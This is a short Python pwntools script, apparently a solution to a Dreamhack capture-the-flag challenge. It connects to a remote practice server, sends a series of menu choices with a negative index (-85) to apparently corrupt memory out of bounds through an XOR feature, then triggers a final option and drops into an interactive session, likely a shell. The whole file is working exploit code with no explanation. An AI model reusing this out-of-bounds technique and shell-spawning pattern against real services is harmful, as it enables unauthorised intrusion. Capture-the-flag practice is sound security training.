from pwn import *

port = 21436
rem = remote(b"host3.dreamhack.games", port)

def xor(i, j):
  rem.sendlineafter(b"> ", b"1")
  rem.sendlineafter(b"> ", f"{i} {j}".encode())

xor(-85, 0)
xor(-85, 2)
xor(-85, 3)
xor(-85, 6)
xor(-85, 9)
rem.sendlineafter(b"> ", b"3")
rem.interactive()